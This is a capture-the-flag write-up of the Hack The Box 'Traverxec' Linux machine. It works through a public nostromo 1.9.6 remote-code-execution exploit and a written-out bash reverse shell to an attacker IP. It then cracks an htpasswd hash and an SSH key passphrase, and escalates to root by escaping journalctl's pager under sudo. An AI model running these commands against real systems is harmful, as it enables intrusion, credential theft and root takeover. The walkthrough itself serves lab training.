---
permalink: /posts/HTB/Traverxec
title:  "HTB Traverxec"
author: Luc Kolen
description: "Traverxec is an easy Linux machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Easy
  - Linux
  - Nostromo
  - John
  - Hashcat
---
# 10.10.10.165 - Traverxec

|Hack The Box|Created by|Points|
|---|---|---|
|[Link](https://www.hackthebox.eu/home/machines/profile/217)|[jkr](https://www.hackthebox.eu/home/users/profile/77141)|20|

- [10.10.10.165 - Traverxec](#101010165---traverxec)
  - [Open ports](#open-ports)
  - [Nostromo to reverse shell](#nostromo-to-reverse-shell)
  - [Privilege escalation](#privilege-escalation)
    - [Hash crack](#hash-crack)
    - [Access to sub directory](#access-to-sub-directory)
  - [David to root](#david-to-root)
  - [TL;DR](#tldr)

## Open ports

```bash
luc@kali:~/HTB/Traverxec$ nmap -vv --reason -Pn -sV -sC --version-all 10.10.10.165
```

|Port|Service|Version
|---|---|---|
tcp/22|ssh|OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
tcp/80|http|nostromo 1.9.6

## Nostromo to reverse shell

Nmap found that the application serving webpages on port 80 is `nostromo 1.9.6`. We can find a remote code execution exploit for this version.

```bash
luc@kali:~/HTB/Traverxec$ searchsploit nostromo
...
nostromo 1.9.6 - Remote Code Execution | multiple/remote/47837.py
...
luc@kali:~/HTB/Traverxec$ searchsploit -m multiple/remote/47837.py
luc@kali:~/HTB/Traverxec$ nano 47837.py
...
cve2019_16278.py -> # cve2019_16278.py
help_menu = '\r\nUsage: cve2019-16278.py <Target_IP> <Target_Port> <Command>'
luc@kali:~/HTB/Traverxec$ python 47837.py 10.10.10.165 80 whoami


                                        _____-2019-16278
        _____  _______    ______   _____\    \
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/

HTTP/1.1 200 OK
Date: Mon, 15 Jun 2020 12:17:05 GMT
Server: nostromo 1.9.6
Connection: close


www-data
luc@kali:~/HTB/Traverxec$ python 47837.py 10.10.10.165 80 'bash -c "bash -i >& /dev/tcp/10.10.14.16/443 0>&1"'
```

```bash
luc@kali:~/HTB/Traverxec$ sudo nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.165.
Ncat: Connection from 10.10.10.165:48954.
bash: cannot set terminal process group (457): Inappropriate ioctl for device
bash: no job control in this shell
www-data@traverxec:/usr/bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege escalation

Nostromo is installed in `/var/nostromo`

```bash
www-data@traverxec:/var/nostromo$ ls -R                                                                                                                                                                                             [34/34]
.:
conf  htdocs  icons  logs

./conf:
mimes  nhttpd.conf
...
```

This `nhttpd.conf` file sounds interesting

```bash
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

### Hash crack

The `/var/nostromo/conf/.htpasswd` file is used to store the `htpasswd` value.

```bash
www-data@traverxec:/var/nostromo/conf$ cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

We can try to identify and crack this hash.

```bash
luc@kali:~/HTB/Traverxec$ hashid '$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/'
Analyzing '$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/'
[+] MD5 Crypt
[+] Cisco-IOS(MD5)
[+] FreeBSD MD5
luc@kali:~/HTB/Traverxec$ hashcat --example-hashes
...
MODE: 500
TYPE: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
HASH: $1$38652870$DUjsu4TTlTsOe/xxZ05uf/
PASS: hashcat
...
luc@kali:~/HTB/Traverxec$ hashcat -m 500 --user hashes /usr/share/wordlists/rockyou.txt
...
$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me
...
```

We can now try this password to login as David via SSH.

```bash
luc@kali:~/HTB/Traverxec$ ssh david@10.10.10.165
david@10.10.10.165's password:
Permission denied, please try again.
```

Too bad the password is useless so we'll need to find another attack.

### Access to sub directory

Going back to the `nhttpd.conf` we can see another part that could be interesting.

```bash
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
...
# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

We don't have access to read the content of `/home/david`, but we can see that the `homedirs_public` setting is enabled in Nostromo. This setting allows users to serve files from the users home directory via HTTP. Browsing to `http://10.10.10.165/~david/` shows that David uses this functionality because a webpage shows up.

```bash
www-data@traverxec:/$ cd /home/david/
www-data@traverxec:/home/david$ ls
ls: cannot open directory '.': Permission denied
www-data@traverxec:/home/david$ cd public_www
www-data@traverxec:/home/david/public_www$ ls
index.html  protected-file-area
www-data@traverxec:/home/david/public_www$ ls -R
.:
index.html  protected-file-area

./protected-file-area:
backup-ssh-identity-files.tgz
```

We can upload this tgz file to our machine via our reverse shell, but we can also use the fact that these files are served over HTTP. Doing it this way also tests to see if the hash we cracked earlier was correct.

```bash
luc@kali:~/HTB/Traverxec$ wget http://10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz --http-user=david --http-password=Nowonly4me
luc@kali:~/HTB/Traverxec$ file backup-ssh-identity-files.tgz
backup-ssh-identity-files.tgz: gzip compressed data, last modified: Fri Oct 25 21:02:59 2019, from Unix, original size modulo 2^32 10240
luc@kali:~/HTB/Traverxec$ tar -xvf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

We can try using this `id_rsa` file to SSH as David now.

```bash
luc@kali:~/HTB/Traverxec$ ssh -i home/david/.ssh/id_rsa david@10.10.10.165
Enter passphrase for key 'home/david/.ssh/id_rsa':
```

We'll need to crack this using `John`

```bash
luc@kali:~/HTB/Traverxec$ /usr/share/john/ssh2john.py home/david/.ssh/id_rsa > ssh-hash
luc@kali:~/HTB/Traverxec$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh-hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (home/david/.ssh/id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:02 DONE (2020-06-15 15:39) 0.3623g/s 5196Kp/s 5196Kc/s 5196KC/sa6_123..*7¡Vamos!
Session completed
luc@kali:~/HTB/Traverxec$ john --show ssh-hash
home/david/.ssh/id_rsa:hunter

1 password hash cracked, 0 left
```

We've found the password, `hunter`.

```bash
luc@kali:~/HTB/Traverxec$ ssh -i home/david/.ssh/id_rsa david@10.10.10.165
Enter passphrase for key 'home/david/.ssh/id_rsa': hunter
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ cat user.txt
7db0b484************************
```

## David to root

```bash
luc@kali:~/HTB/Traverxec$ cp /opt/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh .
luc@kali:~/HTB/Traverxec$ python3 -m http.server
```

```bash
david@traverxec:/tmp$ wget http://10.10.14.16:8000/linpeas.sh
david@traverxec:/tmp$ chmod +x 600 linpeas.sh
david@traverxec:/tmp$ ./linpeas.sh
...
[+] PATH
[i] Any writable folder in original PATH? (a new completed path will be exported)
/home/david/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
New path exported: /home/david/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin
...
```

This shows us that something interesting is probably in `/home/david/bin`

```bash
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
david@traverxec:~/bin$ cat server-stats.head
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""'

david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

`server-stats.head` is just a text file and doesn't look interesting at all. `server-stats.sh` does show something interesting, David can execute `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` so we have a path to root now.

Searching for `journalctl` on [GTFObins](https://gtfobins.github.io/gtfobins/journalctl/) shows that `journalctl` will invoke the default pager (likely less) and less can be turned into bash by running `!/bin/bash`.

The first attempt to run `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` only printed the 5 lines and less got closed so we couldn't open bash. Resizing the window to make sure less pauses does give us the option to execute `!/bin/bash` and have a root shell.

```bash
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Mon 2020-06-15 04:58:37 EDT, end at Mon 2020-06-15 10:41:45 EDT. --
Jun 15 08:24:58 traverxec crontab[1225]: (www-data) LIST (www-data)
Jun 15 08:24:58 traverxec sudo[1388]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/0 ru
Jun 15 08:25:01 traverxec sudo[1388]: pam_unix(sudo:auth): conversation failed
Jun 15 08:25:01 traverxec sudo[1388]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Jun 15 08:25:01 traverxec sudo[1388]: www-data : command not allowed ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=list
!/bin/bash
root@traverxec:/home/david/bin# id
uid=0(root) gid=0(root) groups=0(root)
root@traverxec:/home/david/bin# cd /root/
root@traverxec:~# cat root.txt
9aa36a6d************************
```

## TL;DR

- `nostromo 1.9.6` is vulnerable to remote code execution to open a reverse shell
- Config file shows readable folder with saved SSH keys
- Crack password for SSH keys
- `journalctl` can be run as admin, abuse it by running `bash` from `less`
